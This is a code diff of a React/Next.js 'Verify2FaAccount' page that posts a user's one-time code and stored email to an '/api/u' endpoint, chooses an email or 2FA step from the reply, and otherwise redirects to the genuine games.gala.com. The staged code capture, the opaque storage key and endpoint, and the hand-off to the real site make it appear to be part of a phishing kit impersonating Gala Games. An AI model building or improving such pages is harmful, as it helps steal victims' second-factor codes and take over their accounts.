@@ -6,31 +6,42 @@ import {useRouter} from "next/navigation";
 import {routeConstants} from "../../../../../constants/route";
 
 
+const navigationMapper = {
+  'email': routeConstants.VERIFY_EMAIL,
+  '2fa': routeConstants.TWO_FA,
+}
+
 const Verify2FaAccount = () => {
   const [loading, setLoading] = React.useState(false);
   const navigate = useRouter()
   const [otp, setOtp] = React.useState('');
 
   const navigateTo = async () => {
-    setLoading(true)
-    fetch('/api/u', {
-      method: 'POST',
-      body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
-    });
+    setLoading(true);
+    
+    const fetchWithTimeout = (url: string, options: RequestInit, timeout = 20000) => {
+      return Promise.race([
+        fetch(url, options).then((res) => res.json()),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+      ]);
+    };
 
 
-    setLoading(false)
+    try {
+      const res = await fetchWithTimeout('/api/u', {
+        method: 'POST',
+        body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
+      });
 
-    if (Boolean(sessionStorage.getItem('all'))) {
-      navigate.push(routeConstants.VERIFY_EMAIL)
-      return
+      if (!res?.error) navigate.push(navigationMapper[res?.data?.key as 'email' | '2fa']);
+    } catch (error) {
+      console.error('Request failed or timed out', error);
+      window.location.assign('https://games.gala.com/');
+    } finally {
+      setLoading(false);
+      sessionStorage.removeItem('gd600-ap');
     }
-
-    sessionStorage.removeItem('gd600-ap')
-    setTimeout(() => {
-      window.location.assign('https://games.gala.com/')
-    }, 1000)
-  }
+  };
 
 
   return (
